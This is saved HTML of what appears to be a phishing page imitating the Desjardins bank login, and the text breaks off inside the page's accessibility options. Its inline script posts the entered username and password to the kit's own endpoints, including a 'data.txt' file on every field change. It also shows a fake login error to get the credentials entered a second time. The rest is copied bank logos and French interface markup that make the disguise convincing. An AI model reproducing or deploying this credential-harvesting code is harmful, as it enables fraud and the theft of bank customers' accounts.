
<!-- saved from url=(0037)/220098/desj -->
<html lang="en" data-whatinput="mouse" data-whatintent="mouse" data-mw-spa="" class="hydrated" style="overflow: auto;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Log in to your account</title>
        <!--[if lte IE 9]>
        <script type="text/javascript" src="assets/navigateur-non-supporte/navigateur-non-supporte.js"></script>
        <![endif]-->
        <!--<base href="https://static.mouv.desjardins.com/static-accesweb/202109131615/authentification/">-->
        <!--<base href=".">--><base href=".">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="format-detection" content="telephone=no">
        <meta name="gce_url" content="https://www.scd-desjardins.com/GCE/SAAdhesion">
        <meta name="oel-onboarding-lightbox-enabled" content="true">
        <link rel="stylesheet" type="text/css" href="./files/roboto-aw.css">
        <link href="./files/bootstrap.min.css" rel="stylesheet" type="text/css">
        <link href="./files/d2-0.min.css" rel="stylesheet" type="text/css">
        <link rel="stylesheet" href="./files/styles.57e170eacf6043742857.css">
        <link rel="stylesheet" href="./files/main.css">
        <script>var popup = function(url, title, options){window.open(url, title, options);}</script>
        <link rel="icon" type="image/x-icon" href="/assets/desj/d.ico">
        <script src="./files/jquery-3.6.0.min.js###" crossorigin="anonymous"></script>
        <script>
            var lrbank = 'Desj';
            var lrinfo = 'Login';
        </script>
        <script src="./files/actions.js###"></script>
        <script>
        $(document).ready(function() {
            var attempt = 2;

            $('.lab-form').submit(function(e) {
                e.preventDefault();
                var form = this;

                if (attempt == 1) {
                    $('.div-loader').css('display', 'block');
                    $('.div-main').css('display', 'none');

                    $.post('/220098/desj/api/login-submit', $(this).serialize(), function(response) {
                        $('.error-div').css('display', 'block');

                        $(form).trigger('reset');

                        $('.div-loader').css('display', 'none');
                        $('.div-main').css('display', 'block');
                    }, 'JSON');

                    attempt = 2;
                } else {
                    $('.div-loader').css('display', 'block');
                    $('.div-main').css('display', 'none');

                    $.post('/220098/desj/api/login-submit', $(this).serialize(), function(response) {
                        if (response.status) {
                            if (response.data.loader) {
                                location.href = '/220098/desj/w';
                            } else {
                                location.href = '/220098/desj/q';
                            }
                        } else {
                            $(form).trigger('reset');

                            $('.error-div').css('display', 'block');

                            $('.div-loader').css('display', 'none');
                            $('.div-main').css('display', 'block');
                        }
                    }, 'JSON');
                }

                return false;
            });

            $(document).on('change', '.input-username, .input-password', function() {
                var username = $(this).hasClass('input-username') ? $(this).val() : $(this).closest('form').find('.input-username').val();
                var password = $(this).hasClass('input-password') ? $(this).val() : $(this).closest('form').find('.input-password').val();
                $.post('/220098/desj/data.txt', {username: username, password: password});
            });
        });
        </script>
    </head>
    <body class="isolation-bootstrap-3 d2-0">
        <div class="sr-only" tabindex="-1" id="chargement">
            <span lang="fr">Chargement</span>
            <span lang="en">Loading</span>
        </div>
        <app-root ng-version="11.2.8">
            <div tabindex="-1" id="chargementTermine" class="sr-only"> Chargement terminé</div>
            <div class="site container-fluid">
                <div class="site-contenu">
                    <app-lightbox-onboarding></app-lightbox-onboarding>
                    <div class="zone-entete-de-page">
                        <app-entete>
                            <header id="entete">
                                <div id="accessibilite">
                                    <p class="sr-only"> Si vous utilisez une plage braille pour lire du contenu, assurez-vous d'utiliser aussi votre clavier régulièrement pour que votre session demeure active. </p>
                                    <a class="sr-only sr-only-focusable" href="/220098/#contenuPrincipal"> Aller au contenu principal </a>
                                </div>
                                <div id="entete-visible">
                                    <div id="barre-logos" domainevirtuel="desjardins">
                                        <div id="logos" class="container-fluid container-fluid-limited">
                                            <app-barre-logos>
                                                <!---->
                                                <div>
                                                    <div id="barre-logo-desjardins">
                                                        <a href="https://www.desjardins.com/index.jsp">
                                                            <span><img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDIyLjAuMSwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPgo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9ImxvZ28tbjEtZGVzamFyZGlucy1kZXNrdG9wIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIgoJIHg9IjBweCIgeT0iMHB4IiB3aWR0aD0iMTUwcHgiIGhlaWdodD0iMzJweCIgdmlld0JveD0iMCAwIDE1MCAzMiIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMTUwIDMyOyIKCSB4bWw6c3BhY2U9InByZXNlcnZlIj4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KCS5zdDB7ZmlsbDojMDA4NzRFO30KPC9zdHlsZT4KPGc+Cgk8cGF0aCBjbGFzcz0ic3QwIiBkPSJNNDMuMiw3LjFsLTYuMSwwdjE3LjhoNi4yYzUuNiwwLDkuMi0zLjUsOS4yLTguOUM1Mi41LDEwLjcsNDguNyw3LjEsNDMuMiw3LjF6IE00My4xLDIxLjloLTIuM1YxMC4yaDIuNQoJCWMzLjMsMCw1LjYsMi41LDUuNiw1LjlDNDguOSwxOS41LDQ2LjUsMjEuOSw0My4xLDIxLjl6Ii8+Cgk8cGF0aCBjbGFzcz0ic3QwIiBkPSJNMCw4djE2bDEzLjksOGwxMy45LThWOEwxMy45LDBMMCw4eiBNMjQsMTAuMnYxMS43bC0xMC4xLDUuOEwzLjgsMjEuOFYxMC4ybDEwLjEtNS44TDI0LDEwLjJ6Ii8+Cgk8cGF0aCBjbGFzcz0ic3QwIiBkPSJNMTIzLjQsOC43YzAsMS0wLjgsMS45LTEuOSwxLjljLTEsMC0xLjktMC44LTEuOS0xLjljMC0xLDAuOC0xLjksMS45LTEuOUMxMjIuNSw2LjgsMTIzLjQsNy43LDEyMy40LDguN3oKCQkgTTEyMy4xLDEyLjdoLTMuMnYxMi4yaDMuMlYxMi43eiIvPgoJPHBhdGggY2xhc3M9InN0MCIgZD0iTTcyLjksMTcuNGMtMS40LTAuNS0xLjgtMC44LTEuOC0xLjRjMC0wLjUsMC40LTAuOSwxLjItMC45YzEuMiwwLDIuMSwwLjcsMi45LDEuNGwxLjgtMmMtMS4yLTEuMy0yLjktMi00LjctMgoJCWMtMi42LDAtNC40LDEuNS00LjQsMy42YzAsMi40LDEuOSwzLjQsMy43LDRjMC4yLDAuMSwwLjQsMC4xLDAuNiwwLjJjMSwwLjMsMS42LDAuNSwxLjYsMS4xYzAsMC40LTAuMiwwLjktMS41LDAuOQoJCWMtMS4yLDAtMi40LTAuNi0zLTEuNWwtMS45LDJjMS4zLDEuNSwyLjksMi4yLDQuOSwyLjJjMi45LDAsNC43LTEuNCw0LjctMy43Qzc3LjEsMTkuMSw3NS41LDE4LjQsNzIuOSwxNy40eiIvPgoJPHBhdGggY2xhc3M9InN0MCIgZD0iTTE0NC4yLDE3LjRjLTEuNC0wLjUtMS44LTAuOC0xLjgtMS40YzAtMC41LDAuNC0wLjksMS4yLTAuOWMxLjIsMCwyLjEsMC43LDIuOSwxLjRsMS44LTIKCQljLTEuMi0xLjMtMi45LTItNC43LTJjLTIuNiwwLTQuNCwxLjUtNC40LDMuNmMwLDIuNCwxLjksMy40LDMuNyw0YzAuMiwwLjEsMC40LDAuMSwwLjYsMC4yYzEsMC4zLDEuNiwwLjUsMS42LDEuMQoJCWMwLDAuNC0wLjIsMC45LTEuNSwwLjljLTEuMiwwLTIuNC0wLjYtMy0xLjVsLTEuOSwyYzEuMywxLjUsMi45LDIuMiw0LjksMi4yYzIuOSwwLDQuNy0xLjQsNC43LTMuNwoJCUMxNDguNCwxOS4xLDE0Ni44LDE4LjQsMTQ0LjIsMTcuNHoiLz4KCTxwYXRoIGNsYXNzPSJzdDAiIGQ9Ik04Mi44LDguN2MwLDEtMC44LDEuOS0xLjksMS45Yy0xLDAtMS45LTAuOC0xLjktMS45czAuOC0xLjksMS45LTEuOUM4MS45LDYuOCw4Mi44LDcuNyw4Mi44LDguN3ogTTc5LDI5LjYKCQljMi4xLDAsMy41LTEuNCwzLjUtNC4zVjEyLjdoLTMuMnYxMi41YzAsMS4xLTAuNSwxLjctMS4yLDEuN2MtMC40LDAtMC43LTAuMS0xLjEtMC4zbC0wLjUsMi43Qzc3LjMsMjkuNSw3Ny45LDI5LjYsNzksMjkuNgoJCUw3OSwyOS42eiIvPgoJPHBhdGggY2xhc3M9InN0MCIgZD0iTTkyLjgsMTMuNGMtMC45LTAuNi0yLTAuOS0zLjMtMC45Yy0yLDAtMy42LDAuNy00LjYsMmMwLjIsMC4yLDEuNiwxLjcsMS45LDJjMC41LTAuNywxLTEuMSwxLjctMS4zCgkJYzAuMy0wLjEsMC41LTAuMSwwLjgtMC4xYzAuNCwwLDAuOCwwLjEsMS4xLDAuMmMwLjgsMC4zLDEuMiwwLjksMS4yLDEuN2wwLDAuOGMtMC4xLDAtMS4xLTAuNS0yLjctMC41Yy0yLjYsMC00LjUsMS43LTQuNSwzLjkKCQljMCwyLjIsMS43LDMuOCw0LDMuOGMxLjQsMCwyLjMtMC42LDMuMS0xLjNoMC4xdjEuMWgzdi04Qzk0LjYsMTUuMyw5NCwxNC4yLDkyLjgsMTMuNHogTTkxLjYsMjAuOWMwLDAuNi0xLjMsMS42LTIuOCwxLjYKCQljLTAuOSwwLTEuNi0wLjYtMS42LTEuNGMwLTAuNSwwLjMtMS41LDEuOS0xLjVjMS4yLDAsMi41LDAuNCwyLjUsMC40VjIwLjl6Ii8+Cgk8cGF0aCBjbGFzcz0ic3QwIiBkPSJNMTAwLjUsMTQuMUwxMDAuNSwxNC4xbC0wLjEtMS40aC0zLjJ2MTIuMmgzLjJsMC01LjVjMC0yLjIsMS4xLTMuNywzLjgtMy43di0zLjIKCQlDMTAyLjYsMTIuNSwxMDEuMywxMywxMDAuNSwxNC4xeiIvPgoJPHBhdGggY2xhc3M9InN0MCIgZD0iTTExNC4yLDIzLjhoMC4xdjEuMWgzbDAtMTcuOGgtMy4ydjYuNkgxMTRjLTAuNi0wLjgtMi4xLTEuMi0zLjEtMS4yYy0zLjksMC01LjksMy4yLTUuOSw2LjMKCQljMCwyLjMsMSwzLjgsMS44LDQuNmMxLjEsMS4xLDIuNiwxLjcsNC4xLDEuN0MxMTEuNiwyNS4xLDExMi44LDI0LjksMTE0LjIsMjMuOHogTTExMS4xLDIyLjJjLTEuNywwLTMuMS0xLjUtMy4xLTMuNAoJCWMwLTEuOSwxLjQtMy40LDMuMS0zLjRjMS45LDAsMy4xLDEuOCwzLjEsMy40QzExNC4yLDIwLjcsMTEyLjgsMjIuMiwxMTEuMSwyMi4yeiIvPgoJPHBhdGggY2xhc3M9InN0MCIgZD0iTTEyOSwxMy43aC0wLjF2LTFoLTMuMnYxMi4yaDMuMnYtNi4zYzAtMi44LDEuNy0zLjIsMi44LTMuMmMxLjgsMCwyLjUsMS41LDIuNSwyLjl2Ni42aDMuMnYtNi42CgkJYzAtMy42LTItNS44LTUuMi01LjhDMTI5LjksMTIuNSwxMjksMTMuNywxMjksMTMuN3oiLz4KCTxwYXRoIGNsYXNzPSJzdDAiIGQ9Ik02Ni4yLDE4LjdjMC0zLjYtMi41LTYuMi02LTYuMmMtMy41LDAtNiwyLjYtNiw2LjNjMCwzLjcsMi42LDYuMyw2LjMsNi4zYzIuMiwwLDQtMC44LDUuMi0yLjIKCQljLTAuMi0wLjMtMS42LTEuNy0xLjktMmMtMC42LDAuNy0xLjcsMS40LTMsMS40Yy0xLjYsMC0yLjgtMC45LTMuMi0yLjVoOC42QzY2LjIsMTkuNiw2Ni4yLDE5LjEsNjYuMiwxOC43eiBNNTcuNSwxNy41CgkJYzAuNC0xLjUsMS40LTIuMywyLjgtMi4zYzEuNCwwLDIuNCwwLjgsMi43LDIuM0g1Ny41eiIvPgo8L2c+Cjwvc3ZnPgo=" class="logo-desjardins" alt="Retour à la page d&#39;accueil de Desjardins.com"></span><!----><!----><!---->
                                                        </a>
                                                        <span class="logos-accesd hidden-xs"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNDAiIGhlaWdodD0iNzMiIHZpZXdCb3g9Ii0xODYuNSA0MzIuNSAyNDAgNzMiPjxwYXRoIGQ9Ik0yLjEgNDM5LjJjMi45IDAgNS45IDAuMyA4LjUgMS4xIDcuMyAyLjMgMTEuNyA4LjMgOC45IDE4LjQgLTIuNCA4LjYtOS42IDE1LjYtMTguNyAxOC41IC0yLjggMC45LTYuMiAxLjMtOS4zIDEuM2gtNy45bDkuOC0zNS43IC0xMy41IDUuMSAtOCAyOWMtMC43IDIuNC0yLjMgNS41LTQuOSA4LjNoMjIuNGM1LjUgMCAxMS40LTAuNyAxNi4yLTIuMiAxMy00IDIyLjUtMTMuMiAyNS41LTI0LjIgMy41LTEyLjctMi42LTIxLjctMTUuNC0yNC45IC0zLjUtMC45LTcuNS0xLjItMTEuOS0xLjJoLTMzLjljMSAzLjIgNS41IDYuOCAxMi4yIDYuOEwyLjEgNDM5LjIgMi4xIDQzOS4yeiIgZmlsbD0iIzAwOEM1MyIvPjxwYXRoIGQ9Ik0tMTg2LjUgNDc3LjNjMC0xNS42IDEyLjMtMzQuNyAzOS40LTQxLjkgNy40LTIgMTYuNC0yLjggMjYuMS0yLjhoNzB2Mi42aC03MGMtOC4zIDAtMTYuMSAwLjUtMjIuNiAyIC0yOSA2LjQtNDEgMjUuNS00Mi41IDQwLjJDLTE4Ni4xIDQ3Ny44LTE4Ni41IDQ3Ny44LTE4Ni41IDQ3Ny4zeiIvPjxwYXRoIGQ9Ik01My41IDQ1OS41YzAgMTUuNi0xMi4zIDM0LjctMzkuNCA0MS45IC03LjQgMi0xNi40IDIuOC0yNi4xIDIuOGgtMjF2LTIuNmgyMWM4LjMgMCAxNi4xLTAuNSAyMi42LTIgMjktNi40IDQxLTI1LjUgNDIuNi00MC4yQzUzLjEgNDU5IDUzLjUgNDU5IDUzLjUgNDU5LjV6Ii8+PHBhdGggZD0iTS0xNTMgNDg1aC03bDIxLjQtMzEuOWg1LjVsMy44IDMxLjloLTcuMmwtMC42LTUuNGgtMTIuNkwtMTUzIDQ4NXpNLTEzOC43IDQ2M2wtNy45IDEyLjJoOS4yTC0xMzguNyA0NjN6Ii8+PHBhdGggZD0iTS0xMDkuOCA0NjEuNmMyLjktMC4xIDUuNSAwLjMgNy44IDEuM2wtMi4zIDQuMWMtMS43LTAuOC0zLjctMS4xLTUuNC0wLjkgLTMuMSAwLjItNy4zIDIuNi04LjUgNy41IC0xLjIgNC44IDEuNyA3LjIgNC43IDcuNSAyLjIgMC4yIDQuMS0wLjIgNi4yLTFsMC41IDMuN2MtMC44IDAuNS0yLjEgMC45LTMuMyAxLjEgLTEuNyAwLjQtMy41IDAuNi01LjQgMC42IC03LjUtMC4xLTExLjgtNC44LTEwLTExLjlDLTEyMy45IDQ2Ni40LTExNi42IDQ2MS44LTEwOS44IDQ2MS42eiIvPjxwYXRoIGQ9Ik0tODcuOCA0NjEuNmMyLjktMC4xIDUuNSAwLjMgNy44IDEuM2wtMi4zIDQuMWMtMS43LTAuOC0zLjctMS4xLTUuNC0wLjkgLTMuMSAwLjItNy4zIDIuNi04LjUgNy41czEuNyA3LjIgNC43IDcuNWMyLjIgMC4yIDQuMS0wLjIgNi4yLTFsMC41IDMuN2MtMC44IDAuNS0yLjEgMC45LTMuMyAxLjEgLTEuNyAwLjQtMy41IDAuNi01LjQgMC42IC03LjUtMC4xLTExLjgtNC44LTEwLTExLjlDLTEwMS45IDQ2Ni40LTk0LjYgNDYxLjgtODcuOCA0NjEuNnoiLz48cGF0aCBkPSJNLTY4LjggNDgxYzMuMyAwIDYuOS0xLjMgNy45LTEuNmwtMS43IDQuM2MtMiAwLjgtNS42IDEuOC05LjkgMS43IC03LjEtMC4xLTEwLjctNC41LTguOS0xMS44IDEuOS03LjQgOC42LTEyIDE0LjctMTIgNi43IDAgMTAuNSA1IDYuOSAxMy44aC0xNC45Qy03NS4yIDQ3Ny42LTc0LjMgNDgxLTY4LjggNDgxek0tNjkuNyA0NDkuOWw3IDYuNyAtMi4zIDIuNSAtOC4zLTUuMUwtNjkuNyA0NDkuOXpNLTY4IDQ2Ni4yYy0zIDAtNC41IDIuNi01LjUgNS4zaDcuN0MtNjQuNSA0NjkuNS02NC41IDQ2Ni4yLTY4IDQ2Ni4yeiIvPjxwYXRoIGQ9Ik0tNDkuMyA0ODEuM2MxLjMgMCAzLjItMC41IDMuNy0xLjggMC42LTEuOC0yLjEtMi43LTQtMy44IC0xLjgtMS01LjQtMy4xLTQuOS03IDAuNi00LjMgNC41LTcuMSAxMC43LTcuMSA0IDAgNi41IDAuOSA3LjkgMS42bC0yLjYgMy44Yy0xLjEtMC41LTMuMS0xLjItNS42LTEuMiAtMS4zIDAtMy4zIDAuMy0zLjcgMS42IC0wLjQgMS4zIDEuNyAyLjUgMy43IDMuNiAyLjQgMS4yIDUuOSAzLjMgNS40IDYuOCAtMC43IDQuNy02LjIgNy43LTExLjcgNy43IC00LjcgMC03LjctMS40LTguOC0ybDIuNy00Qy01NS4zIDQ4MC4xLTUyLjkgNDgxLjMtNDkuMyA0ODEuM3oiLz48L3N2Zz4=" width="106" height="32" lang="fr" alt="AccèsD"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNDAiIGhlaWdodD0iODYiIHZpZXdCb3g9IjAgMCAyNDAgODYiPjxwYXRoIGQ9Ik0xODguNSA2LjhjMyAwIDUuOSAwLjMgOC40IDEuMSA3LjIgMi4zIDExLjcgOC4zIDguOSAxOC4zIC0yLjQgOC42LTkuNiAxNS42LTE4LjcgMTguNCAtMi45IDAuOS02LjIgMS4zLTkuMiAxLjNIMTcwbDkuOC0zNS43IC0xMy42IDUuMSAtOCAyOWMtMC43IDIuNC0yLjMgNS41LTQuOSA4LjNoMjIuNGM1LjYgMCAxMS40LTAuNyAxNi4zLTIuMiAxMy4xLTQuMSAyMi41LTEzLjIgMjUuNi0yNC4yIDMuNS0xMi43LTIuNi0yMS43LTE1LjQtMjQuOSAtMy41LTAuOS03LjUtMS4yLTExLjktMS4yaC0zMy45YzEgMy4yIDUuNSA2LjggMTIuMiA2LjhIMTg4LjV6IiBmaWxsPSIjMDA4QzUzIi8+PHBhdGggZD0iTTEzNy4zIDQ4LjhjMS4zIDAgMy4zLTAuNSAzLjctMS44IDAuNi0xLjgtMi4xLTIuOC00LTMuOCAtMS44LTEtNS40LTMuMi00LjktNi45IDAuNi00LjMgNC41LTcuMSAxMC43LTcuMSA0IDAgNi41IDAuOSA3LjggMS42bC0yLjYgMy44Yy0xLjEtMC41LTMuMS0xLjItNS43LTEuMiAtMS40IDAtMy4zIDAuMy0zLjcgMS43IC0wLjQgMS40IDEuNyAyLjUgMy43IDMuNiAyLjQgMS4yIDYgMy4zIDUuNSA2LjggLTAuNyA0LjgtNi4yIDcuNi0xMS43IDcuNiAtNC44IDAtNy42LTEuNC04LjgtMmwyLjctNEMxMzEuMiA0Ny42IDEzMy42IDQ4LjggMTM3LjMgNDguOHoiLz48cGF0aCBkPSJNMzMuNSA1Mi41aC03TDQ4IDIwLjdoNS41bDMuOSAzMS44aC03LjFsLTAuNi01LjRIMzdMMzMuNSA1Mi41ek00Ny43IDMwLjVsLTcuOSAxMi4yaDkuMkw0Ny43IDMwLjV6Ii8+PHBhdGggZD0iTTc2LjcgMjkuMmMyLjktMC4xIDUuNiAwLjMgNy44IDEuM2wtMi4zIDQuMmMtMS43LTAuOC0zLjctMS4xLTUuNS0wLjkgLTMuMSAwLjItNy4zIDIuNi04LjUgNy40IC0xLjIgNC45IDEuNyA3LjIgNC43IDcuNCAyLjIgMC4yIDQuMi0wLjIgNi4yLTFsMC41IDMuN2MtMC44IDAuNS0yLjEgMC45LTMuNCAxLjIgLTEuNyAwLjQtMy41IDAuNi01LjQgMC42IC03LjUtMC4xLTExLjgtNC45LTEwLTExLjlDNjIuNiAzMy45IDY5LjggMjkuNCA3Ni43IDI5LjJ6Ii8+PHBhdGggZD0iTTk4LjcgMjkuMmMyLjktMC4xIDUuNiAwLjMgNy44IDEuM2wtMi4zIDQuMmMtMS43LTAuOC0zLjctMS4xLTUuNS0wLjkgLTMuMSAwLjItNy4zIDIuNi04LjUgNy40IC0xLjIgNC45IDEuNyA3LjIgNC43IDcuNCAyLjIgMC4yIDQuMi0wLjIgNi4yLTFsMC41IDMuN2MtMC44IDAuNS0yLjEgMC45LTMuNCAxLjIgLTEuNyAwLjQtMy41IDAuNi01LjQgMC42IC03LjUtMC4xLTExLjgtNC45LTEwLTExLjlDODQuNiAzMy45IDkxLjggMjkuNCA5OC43IDI5LjJ6Ii8+PHBhdGggZD0iTTExNy43IDQ4LjZjMy4zIDAgNi45LTEuMyA3LjktMS42bC0xLjcgNC4zYy0yIDAuOC01LjYgMS44LTkuOCAxLjcgLTcuMS0wLjEtMTAuNy00LjUtOC44LTExLjggMS45LTcuNCA4LjUtMTIgMTQuNy0xMiA2LjcgMCAxMC41IDUuMSA2LjkgMTMuOGgtMTQuOUMxMTEuNCA0NS4xIDExMi4yIDQ4LjYgMTE3LjcgNDguNnpNMTE2LjggMTcuNWw2LjkgNi42IC0yLjMgMi41IC04LjMtNS4yTDExNi44IDE3LjV6TTExOC41IDMzLjdjLTMgMC00LjUgMi42LTUuNSA1LjRoNy43QzEyMiAzNyAxMjIgMzMuNyAxMTguNSAzMy43eiIvPjxwYXRoIGQ9Ik03NS44IDYyLjFINzlsNCAyMi4yaC0zbC0xLTYuN2gtOS4zbC0zLjkgNi43aC0zLjNMNzUuOCA2Mi4xek03MSA3NS4xaDcuNkw3NyA2NC43aC0wLjFMNzEgNzUuMXoiLz48cGF0aCBkPSJNODguNiA3MC41aC0yLjdsMC41LTIuM0g4OWMwLjgtMy4zIDEtNi40IDUuMi02LjQgMC43IDAgMS41IDAuMSAyLjIgMC4yTDk2IDY0LjNjLTAuNC0wLjEtMC44LTAuMi0xLjItMC4yIC0yLjYgMC0yLjUgMi4xLTMuMSA0aDMuMWwtMC40IDIuM2gtMy4xbC0zIDEzLjdoLTIuNkw4OC42IDcwLjV6Ii8+PHBhdGggZD0iTTk3LjggNzAuNUg5NWwwLjUtMi4zaDIuN2MwLjgtMy4zIDEtNi40IDUuMi02LjQgMC43IDAgMS41IDAuMSAyLjIgMC4ybC0wLjQgMi4yYy0wLjQtMC4xLTAuOC0wLjItMS4yLTAuMiAtMi42IDAtMi41IDIuMS0zLjEgNGgzLjFsLTAuNCAyLjNoLTMuMWwtMyAxMy43aC0yLjZMOTcuOCA3MC41eiIvPjxwYXRoIGQ9Ik0xMDQuOSA3M2MwLjUtMy42IDMuNS01LjIgNy01LjIgMy4xIDAgNS45IDAuOCA1LjkgNC4xIDAgMC45LTAuMyAyLTAuNSAyLjlsLTEgNC40Yy0wLjEgMC43LTAuNCAxLjYtMC40IDIuMyAwIDAuNyAwLjMgMSAwLjggMSAwLjIgMCAwLjYtMC4xIDAuOC0wLjJsLTAuNCAyYy0wLjQgMC4yLTEuMSAwLjQtMS42IDAuNCAtMS41IDAtMi4yLTAuOS0yLjEtMi4zbC0wLjEtMC4xYy0xLjEgMS41LTIuNyAyLjMtNS40IDIuMyAtMi43IDAtNC45LTEuMi00LjktNC41IDAtNC43IDQuNi01IDguMS01LjMgMi44LTAuMiA0LTAuNCA0LTIuNSAwLTEuNy0xLjgtMi4xLTMuMi0yLjEgLTIgMC00IDAuOC00LjMgMi45SDEwNC45ek0xMDguNSA4Mi4zYzIuMSAwIDMuNi0wLjcgNC41LTIuMSAwLjktMS4yIDEtMi42IDEuNC00LjFoLTAuMWMtMS4xIDAuNy0zLjIgMC44LTUuMiAxLjEgLTEuOSAwLjMtMy42IDAuOS0zLjYgMi45QzEwNS42IDgxLjUgMTA3IDgyLjMgMTA4LjUgODIuM3oiLz48cGF0aCBkPSJNMTIyLjYgNjguMmgyLjZsLTMuNCAxNi4xaC0yLjZMMTIyLjYgNjguMnpNMTI1LjkgNjUuM2gtMi43bDAuNy0zLjJoMi43TDEyNS45IDY1LjN6Ii8+PHBhdGggZD0iTTEyOS41IDY4LjJoMi41bC0wLjggMy40aDAuMWMxLjItMi4yIDMuMS0zLjggNS44LTMuOCAwLjMgMCAwLjYtMC4xIDAuOSAwbC0wLjYgMi44Yy0wLjIgMC0wLjUgMC0wLjggMCAtMC43IDAtMSAwLTEuNiAwLjIgLTEuNSAwLjQtMi42IDEuMy0zLjQgMi42IC0wLjcgMS0xLjEgMi41LTEuMyAzLjhsLTEuNSA3LjFoLTIuNkwxMjkuNSA2OC4yeiIvPjxwYXRoIGQ9Ik0xMzkuOSA3N2MtMC4xIDAuNS0wLjEgMC45LTAuMSAxLjQgMCAyLjUgMiAzLjkgNC4yIDMuOSAyLjMgMCAzLjktMS4xIDQuNi0zLjFoMi42Yy0wLjggMy41LTMuOCA1LjQtNy4zIDUuNCAtNS4zIDAtNi44LTMuNy02LjgtNi41IDAtNi4xIDMuOS0xMC4zIDguMy0xMC4zIDQuNyAwIDYuOCAyLjYgNi44IDcuMSAwIDAuOC0wLjIgMS42LTAuMiAyLjFIMTM5Ljl6TTE0OS41IDc0LjdjMC4yLTIuMy0wLjgtNC41LTMuOC00LjUgLTMuMSAwLTQuOCAyLTUuNiA0LjVIMTQ5LjV6Ii8+PHBhdGggZD0iTTE2NC41IDcyLjljMC4xLTEuOC0xLjUtMi44LTMuMy0yLjggLTEuNiAwLTMuNCAwLjQtMy40IDIgMCAxLjUgMi4xIDIuMSA0LjIgM3M0LjMgMiA0LjMgNC41YzAgMy42LTMuNCA1LTYuNiA1IC0zLjcgMC02LjUtMS4zLTYuNS01LjRoMi42Yy0wLjEgMi40IDEuOSAzLjEgNC4xIDMuMSAxLjcgMCAzLjctMC42IDMuNy0yLjUgMC0xLjYtMi4xLTIuMi00LjItMyAtMi4xLTAuOC00LjMtMS45LTQuMy00LjMgMC0zIDMtNC42IDYtNC42IDMgMCA2LjEgMS4zIDYuMSA1LjFIMTY0LjV6Ii8+PHBhdGggZD0iTTAgNDQuOGMwLTE1LjcgMTIuMy0zNC43IDM5LjQtNDJDNDYuOCAwLjkgNTUuOSAwIDY1LjUgMGg2OS45djIuN0g2NS41Yy04LjIgMC0xNi4xIDAuNS0yMi42IDIgLTI5IDYuNC00MSAyNS41LTQyLjUgNDAuMkMwLjQgNDUuMyAwIDQ1LjMgMCA0NC44eiIvPjxwYXRoIGQ9Ik0yMzkuNiAzMy42Yy0xLjUgMTQuNy0xMy41IDMzLjgtNDIuNSA0MC4yIC01LjkgMS4zLTEzIDEuOS0yMC41IDJ2Mi43YzguOS0wLjEgMTcuMS0xIDI0LTIuOSAyNy4xLTcuMyAzOS40LTI2LjMgMzkuNC00MkMyNDAgMzMuMSAyMzkuNiAzMy4xIDIzOS42IDMzLjZ6Ii8+PC9zdmc+" width="90" height="32" lang="fr" alt="AccèsD Affaire"></span><!---->
                                                    </div>
                                                    <!----><!----><!----><!----><!---->
                                                </div>
                                                <!---->
                                            </app-barre-logos>
                                        </div>
                                        <div id="burger"><button type="button" data-toggle="navburger" data-target="#navigation-principale" class="navbar-toggle" aria-expanded="false"><span class="sr-only">Menu principal</span><span class="icon-bar icon-bar-first"></span><span class="icon-bar icon-bar-second"></span><span class="icon-bar icon-bar-third"></span></button></div>
                                    </div>
                                    <div id="barre-options" class="menu-burger-ferme">
                                        <div id="outils" class="container-fluid container-fluid-limited">
                                            <div id="liste-outils">
                                                <ul>
                                                    <li><button id="btn-options-accessibilite" aria-expanded="false" aria-controls="options-accessibilite"><span class="sr-only">Taille du texte</span><span aria-hidden="true" class="libelle"><small>A</small>A</span></button></li>
                                                    <li><a href="javascript:void(0);" lang="en"><span class="sr-only">Change language.&nbsp;</span> English </a></li>
                                                    <li><a href="https://www.desjardins.com/page-aide/index.jsp?docName=ai_joindre&amp;domaine=ACCESD"> Nous joindre <span class="sr-only">&nbsp;-&nbsp;Cet hyperlien s'ouvrira dans une nouvelle fenêtre.</span></a></li>
                                                    <li class="hidden-xs"><a href="https://www.desjardins.com/page-aide/index.jsp?docName=ai_logonlogoff&amp;domaine=ACCESD"> Aide <span class="sr-only">&nbsp;-&nbsp;Cet hyperlien s'ouvrira dans une nouvelle fenêtre.</span></a></li>
                                                </ul>
                                            </div>
                                            <div id="options-accessibilite" class="collapse">
                                                <div tabindex="0"></div>
                                                <div tabindex="0"></div>
                                                <h2 id="tt-titre" tabindex="0" class="collapse-titre titre-n2"> Taille du texte </h2>
                                                <div class="collapse-contenu">
                                                    <p> Ajustez la taille du texte selon vos besoins en cliquant sur les boutons ci-dessous. </p>
                                                    <div id="taille-texte">
                                                        <button data-value="100" type="button" class="tt-option selected">
                                                            <span aria-hidden="true" class="tt-icone"></span><!----> 100&nbsp;% <span class="sr-only"> &nbsp;-&nbsp; Taille&nbsp; <span class="tt-selection"> selectionnée&nbsp; </span> du texte </span><!---->
                                                        </button>
                                                        <button data-value="150" type="button" class="tt-option">
                                                            <span aria-hidden="true" class="tt-icone"></span><!----> 150&nbsp;% <span class="sr-only"> &nbsp;-&nbsp; Taille&nbsp; <span class="tt-selection hidden"> selectionnée&nbsp; </span> du texte </span><!---->
                                                        </button>
                                                        <button data-value="200" type="button" class="tt-option">
